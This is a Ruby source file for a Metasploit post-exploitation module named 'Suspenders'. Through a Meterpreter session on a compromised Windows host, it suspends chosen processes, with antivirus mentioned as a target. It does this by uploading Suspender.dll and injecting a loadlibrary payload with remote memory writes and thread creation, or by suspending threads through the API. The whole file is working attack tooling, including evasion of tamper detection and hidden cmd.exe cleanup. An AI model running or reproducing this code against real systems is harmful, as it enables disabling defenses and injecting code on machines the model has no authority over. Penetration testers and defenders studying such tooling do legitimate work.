# based on meterpreter script suspender.rb by Kerberos, which is based on mubix' blog post at
# http://www.room362.com/blog/2011/5/30/remote-dll-injection-with-meterpreter.html which is
# predicated on Didier Stevens code & blog at http://blog.didierstevens.com/2011/04/27/suspender-dll/
#
#
# TODO:
# -> Test x64 support

require 'msf/core'
#require 'msf/core/post/common'

class Metasploit3 < Msf::Post

	include Msf::Auxiliary::Report
		#TODO:  Report the process as suspended.
	
	def initialize(info={})
		super( update_info( info,
				'Name' => 'Suspenders',
				'Description' => %q{ This module suspends a list of given processes after a given
				delay.  This is accomplished one of two ways.  First, Suspender.dll can be injected
				into the target process.  Second, the meterpreter API can be used to suspend each
				thread in the target process.  To use the Suspender.dll approach you'll have to
				download Suspender.dll (just once), see References for URL.  The module will
				check for the dll at data/suspender/x86/Suspender.dll when a path is not given.  The
				minimum delay for the dll method is 1 second and 0 will automatically be increased.
				The Suspender.dll method currently requires a file upload to the target, however it's
				less likely to trigger a "tampering" warning from certain processes (such as AV
				processes) than the meterpreter API method.  PIDs will be suspended in the order
				they are listed, and process names, if any, will be translated to pids and appended,
				in order, to the list of PIDs (however no process will be suspended twice).  The
				current process in which meterpreter is running is automatically blocked from
				suspension (for your protection).

				This module is a port of the meterpreter script of the same name by kerberos, which
				was inspired by mubix's blog which was inpsired by Didier Stevens' Suspender.dll. },
				'License' => MSF_LICENSE,
				'Author' => [	'kerberos', # original meterpreter script
								'kernelsmith' # post module, ability to do multiple processes
							],
				'Version' => '$Revision$',
				'Platform' => [ 'windows' ],
				'SessionTypes' => [ 'meterpreter' ],
				'References'     =>
					[
						[ 'URL', 'http://blog.didierstevens.com/2011/04/27/suspender-dll/' ],
						[ 'URL', 'http://www.room362.com/blog/2011/5/30/remote-dll-injection-with-meterpreter.html' ],
						[ 'URL', 'http://pastebin.com/tTQASf7R' ],
					]
		))
		register_options(
			[
				OptString.new('PIDS', [false, 'Target process ID list, comma seperated, to suspend',
					nil]),
				OptString.new('PROCESSES', [false,
					'Target process names, comma sep, to suspend (this or PIDS must be set)', nil]),
				OptInt.new('DELAY', [true, 'The delay, in seconds, to wait before suspension', 0]),
			#	OptBool.new('UNSUSPEND', [false, 'I am not sure this can be implemented',false]),
				OptBool.new('USE_DLL', [true,
					'Do NOT use Suspender.dll, this method might bother AVs',true]),
				@@suspender = OptPath.new('SUSPENDER_DLL', [false,
					"Local path to the Suspender.dll, req'd if USE_DLL is true", nil]),
				OptBool.new('HALT', [true, 'Halt further suspension if any failure is encountered',
					false]),
			], self.class)
	end

	def run
		# validate and assign option values
		pids = []
		if (datastore['PIDS'] and not datastore['PIDS'].empty?)
			pids = pids + datastore['PIDS'].split(',')
		end
		processes = []
		if (datastore['PROCESSES'] and not datastore['PROCESSES'].empty?)
			processes = processes + datastore['PROCESSES'].split(',')
		end
 
		delay = datastore['DELAY']
		if (delay < 1 and datastore['USE_DLL'])
			print_status "Minimum delay for the DLL method is 1, changing delay to 1"
			delay = 1
		end
		#undo = datastore['UNSUSPEND']
		tempdir = session.fs.file.expand_path("%TEMP%") || "C:\\"
		if datastore['USE_DLL']
			# TODO:  validate this the fancy way using OptPath.valid?
			if @@suspender.valid?(datastore['SUSPENDER_DLL'])
				suspender = datastore['SUSPENDER_DLL']
			else
				susp_path = ::File.join(Msf::Config.data_directory,'suspender','x86','Suspender.dll')
				if @@suspender.valid?(susp_path)
					suspender = susp_path
				else
					raise OptionValidateError.new('SUSPENDER_DLL'),
					"Could not find Suspender.dll.  A good location to put Suspender.dll is #{susp_path}"
				end
			end
		end
		uploadpath = "#{tempdir}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}#{delay.to_s}.dll"
		@@halt = datastore['HALT']

		# check that pids and/or process names are provided and that pid != 0
		if ( (pids.empty? or pids.include?(0)) and (processes.empty?) )
			# suspending PID 0 will eventually bork the box
			print_error "PIDS and PROCESSES can't both be empty... and PIDS can't contain 0"
			raise Rex::Script::Completed
		end

		# resolve the pids if nec
		if ( processes and not processes.empty? )
			print_status "Resolving the process names to PIDs"
			pids = pids + resolve_process_names_to_pids(processes)
		end
		
		# validate (& cleanup) pids
		pids = validate_pids(pids)

		if pids.empty?
			print_error "No valid pids were supplied.  Exiting."
			raise Rex::Script::Completed # should we skip the stack trace on this error state?
		end

		# proceed based on which method was chosen
		if datastore['USE_DLL']
			suspend_using_dll(pids,delay,uploadpath,suspender)
		else # use the meterpreter api
			suspend_using_api(pids,delay)
		end
	end

	def resolve_process_names_to_pids(processes)
		return [] if (processes.class != Array or processes.empty?)
		pids = []
		processes.each do |process|
			pid = client.sys.process[process] # returns first process encountered w/this name
			if pid 
				pids << pid
				print_status "Found PID:  #{pid}"
			else
				check_halt "Could not find a process with the name #{process}..."
			end
		end
		pids
	end

	def validate_pids(pids)
		# do the following to each pid:
		# - convert to integer
		# - remove pid 0 to protect the system's stability
		# - remove the current meterp pid to avoid suspending our own process
		# - remove redundant entries
		return [] if (pids.class != Array or pids.empty?)
		clean_pids = []
		mypid = client.sys.process.getpid
		pids.each do |pid|
			next if pid.nil?
			ppid = pid.to_i
			if ppid == 0
				check_halt "Found PID 0 in the list, removing..."
			elsif ppid == mypid.to_i
				check_halt "Found my own PID in the list, removing..."
			else
				clean_pids << pid
			end
		end
		# return unique'ified pids
		clean_pids.uniq
	end

	def check_halt(msg,halt=@@halt)
		print_error msg
		if halt
			print_error "Halting.  (set HALT false to change this behavior)"
			raise Rex::Script::Completed
		else
			print_status "Continuing..."
		end
	end

	def suspend_using_api(pids,delay)
		# http://www.room362.com/blog/2011/5/30/remotely-suspend-all-threads-with-meterpreter.html
		# "There are a few AVs engines that detected this as tampering. But if your target isn't AV..."
		targetprocess = nil
		begin
			pids.each do |pid|
				select(nil, nil, nil, delay)
				print_status "Opening target process:  #{pid}"
				targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
				print_status "Suspending threads"
				targetprocess.thread.each_thread do |x|
    				targetprocess.thread.open(x).suspend
				end
			end
		rescue ::Rex::Post::Meterpreter::RequestError => e
			print_error "Error suspending the process threads:  #{e.to_s}"
			check_halt "You may not have the correct permissions (PROCESS_ALL_ACCESS)..."
		ensure
			targetprocess.close if targetprocess
		end
	end
	
	def suspend_using_dll(pids,delay,uploadpath,suspender)
		begin
			# Create payload, do this first so we don't have to delete files if this fails
			print_status("Creating dll injector payload...")
			pay = client.framework.payloads.create("windows/loadlibrary")
			pay.datastore['DLL'] = uploadpath
			pay.datastore['EXITFUNC'] = 'thread'
			raw = pay.generate
		rescue RuntimeError => e
			print_error("Error generating payload #{e.to_s}, can't continue.")
			raise Rex::Script::Completed
		end
		begin
			# Upload suspender to target
			print_status "Uploading Suspender to #{uploadpath}, you'll have to remove this " +
			"manually as it will be in use until the suspended process is killed " + 
			"by you or by the system/user but I'll try to remove it anyways"
			session.fs.file.upload_file("#{uploadpath}", "#{suspender}")
			# TODO:  inject directly into memory instead of uploading first
		rescue Rex::Post::Meterpreter::RequestError => e
			print_error "Error uploading Suspender.dll:  #{e.to_s}, can't continue"
			raise Rex::Script::Completed
		end
		# do injects
		proc = nil
		pids.each do |pid|
			begin
				print_status("Opening process with PID #{pid}...")
				targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
				mem = targetprocess.memory.allocate(raw.length + (raw.length % 1024))
				print_status("Injecting payload")
				targetprocess.memory.write(mem, raw)
				print_status("Executing payload")
				targetprocess.thread.create(mem, 0)
			rescue Rex::Post::Meterpreter::RequestError => e
				print_error "Error injecting payload {e.to_s}, you may not have permission..."
				check_halt "You may not have the correct permissions (PROCESS_ALL_ACCESS)..."
			ensure
				# Let's ensure we close the open process if it's open
				targetprocess.close if targetprocess
			end
		end
		begin # Attempt clean up
			print_status("Cleaning up what I can, but you'll likely have to delete ")
			print_line("#{uploadpath} after you kill the suspended process")
			# in most situations these attempts won't work so we eat the errors raised
			session.fs.file.rm(uploadpath) # try to remove using API & using a shell
			#TODO:  put this in a loop so it will keep trying to delete until it succeeds
			session.sys.process.execute(
				"cmd.exe /c attrib -r #{uploadpath} && del #{uploadpath}",nil, {'Hidden' => true}
			)
		rescue
			Rex::Post::Meterpreter::RequestError
			print_status "Could not remove #{uploadpath} as expected"
		end
	end

end
